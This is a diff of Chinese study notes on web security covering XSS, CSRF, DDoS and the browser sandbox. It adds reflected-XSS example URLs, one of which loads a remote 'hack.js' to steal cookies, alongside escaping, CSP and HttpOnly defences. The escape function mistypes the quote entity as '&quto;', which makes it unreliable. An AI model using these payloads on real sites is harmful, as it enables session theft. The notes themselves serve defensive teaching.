@@ -165,24 +165,64 @@ webSocket本身不存在跨域问题，所以我们可以利用webSocket来进�
 XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。
 如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情。
 
-- 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
+- **可以窃取 Cookie 信息**。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
 - 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
 - 可以通过修改 DOM 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
 - 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。
 
 ### 恶意脚本是怎么注入的
 
-1. **存储型 XSS 攻击**
-   黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
+#### **存储型 XSS 攻击**
 
-2. **反射型 XSS 攻击**
-   在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户
-3. **基于 DOM 的 XSS 攻击**
-   具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。
+黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
+
+#### **反射型 XSS 攻击**
+
+在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户
+
+```js
+// 普通 
+http://localhost:3000/?from=china
+// alert尝试 
+http://localhost:3000/?from=<script>alert(3)</script>
+// 获取Cookie
+http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
+// 短域名伪造 https://dwz.cn/
+```
+
+#### **基于 DOM 的 XSS 攻击**
+
+具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。
 
 ### 如何阻止 XSS 攻击
 
 1. **服务器对输入脚本进行过滤或转码**
+
+   - 黑名单
+
+   ```js
+     function escape(str) {    
+         str = str.replace(/&/g, '&amp;')    
+         str = str.replace(/</g, '&lt;')    
+         str = str.replace(/>/g, '&gt;')    
+         str = str.replace(/"/g, '&quto;')    
+         str = str.replace(/'/g, '&#39;')    
+         str = str.replace(/`/g, '&#96;')    
+         str = str.replace(/\//g, '&#x2F;')    
+         return str  
+     }
+   ```
+
+   - 白名单
+
+   ```js
+     const xss = require('xss')  
+     let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')  
+     // -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
+   ```
+
+   
+
 2. **充分利用 CSP**
    CSP 有如下几个功能：
 
@@ -191,13 +231,30 @@ XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 
 - 禁止执行内联脚本和未授权的脚本；
 - 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。
 
+```js
+// 只允许加载本站资源 
+Content-Security-Policy: default-src 'self'
+// 只允许加载 HTTPS 协议图片 
+Content-Security-Policy: img-src https://*
+// 不允许加载任何来源框架
+Content-Security-Policy: child-src 'none'
+```
+
+
+
 3. **使用 HttpOnly 属性**
 
 由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。
 
+```node
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
+```
+
+
+
 ## CSRF 攻击：陌生链接不要随便点
 
-CSRF 英文全称是**Cross-site request forgery**,所以又称为“跨站请求伪造”，是指黑客引
+CSRF 英文全称是**Cross-site request forgery**,所以又称为“ **跨站请求伪造** ”，是指黑客引
 诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，
 **CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。**
 
@@ -230,7 +287,7 @@ CSRF 英文全称是**Cross-site request forgery**,所以又称为“跨站请�
 - 第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；
 - 第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。
 
-要避免发生 `CSRF 攻击，通常有以下几种途径：
+要避免发生  `CSRF 攻击`，通常有以下几种途径：
 
 1. **充分利用好 `Cookie` 的 `SameSite` 属性**
 
@@ -250,6 +307,23 @@ Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，�
 
 3. **CSRF Toekn**
    服务器生成一个随机字符串，在之后的请求都携带上
+
+## DDOS攻击
+
+DDOS攻击指的是所有使服务器崩溃的手段
+
+常见的有：
+
+- 高并发请求
+- SYN Flood
+- HTTP Flood 
+- ...等等
+
+防范手段：
+
+- 备份网站
+- 使用阿里云等运营商服务器
+- 带宽扩容+CDN 增加攻击成本
 
 ## 安全沙箱
 
@@ -294,3 +368,4 @@ Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，�
 为什么要让他们跑在一个进程里面呢？
 
 因为在一个渲染进程里面，他们就会共享JS的执行环境，也就是说A页面可以直接在B页面中执行脚本。因为是同一家的站点，所以是有这个需求的。
+
